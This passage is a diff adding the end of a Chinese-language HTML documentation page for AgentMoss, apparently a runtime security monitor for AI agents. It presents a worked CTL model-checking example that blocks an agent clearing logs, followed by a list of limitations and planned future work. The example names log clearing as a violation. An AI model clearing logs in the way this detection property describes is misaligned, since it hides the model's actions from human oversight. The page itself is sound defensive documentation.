+        <p>属性: <code>AG(!clear_logs)</code></p>
+        <div class="code-block">Sat(!clear_logs) = { s₁, s₂ }  <span class="comment">// s₃ 有 clear_logs, 不满足</span>
+Sat(AG(!clear_logs)) = { }  <span class="comment">// s₃ 违反, s₁→s₂→s₃ 路径上有 s₃</span>
+violatingStates = S \ Sat(AG(!clear_logs)) = { s₁, s₂, s₃ }
+
+<span class="comment">// 属性违反! s₃ 是直接违反者 → block</span></div>
+      </section>
+
+      <!-- Limitations -->
+      <section class="detail-section" id="limitations">
+        <div class="detail-section-tag">局限性</div>
+        <h2 class="detail-section-title">局限性与未来工作</h2>
+
+        <div class="cards-grid">
+          <div class="card">
+            <h3>局限性</h3>
+            <ul>
+              <li><strong>有限迹语义</strong>: LTL 的 G/F 算子仅检查已发生的事件，无法预测未来</li>
+              <li><strong>状态爆炸</strong>: CTL 标记复杂度 O(|S|²×|φ|)，事件数多时性能下降</li>
+              <li><strong>原子命题粒度</strong>: AP 基于正则匹配，存在 L1 同样的误报问题</li>
+              <li><strong>无 Büchi 自动机</strong>: 使用递归评估，对长迹效率较低</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h3>未来方向</h3>
+            <ul>
+              <li><strong>L3 语义增强</strong>: 将 AP 标记升级为 LLM 辅助语义判断</li>
+              <li><strong>Büchi 自动机</strong>: 将 LTL 编译为 Büchi 自动机，提高长迹效率</li>
+              <li><strong>增量检查</strong>: 仅对新增事件相关部分重新检查</li>
+              <li><strong>概率模型检测 (PCTL)</strong>: 引入概率，检测 "在 80% 的路径上" 这类属性</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="callout" style="margin-top: 24px;">
+          <div class="callout-title">规则统计</div>
+          <p>L2.2 模型检测共 15 条已实现规则：10 条 LTL 攻击模式检测 + 5 条 CTL 安全属性验证。AgentMoss 全部检测层合计 130 条规则。</p>
+        </div>
+      </section>
+
+    </main>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-links">
+      <a href="index.html">首页</a>
+      <a href="architecture.html">架构</a>
+      <a href="detection.html">检测方法</a>
+      <a href="detection-l1.html">L1 检测</a>
+      <a href="detection-l2-1.html">L2.1 检测</a>
+      <a href="detection-l2-2.html">L2.2 检测</a>
+      <a href="rules.html">规则集</a>
+      <a href="usage.html">使用指南</a>
+      <a href="aarm.html">AARM</a>
+    </div>
+    <p>AgentMoss — AI Agent 全链路运行时安全监控框架 · v0.1.0</p>
+  </div>
+</footer>
+
+<script src="js/main.js"></script>
+</body>
+</html>
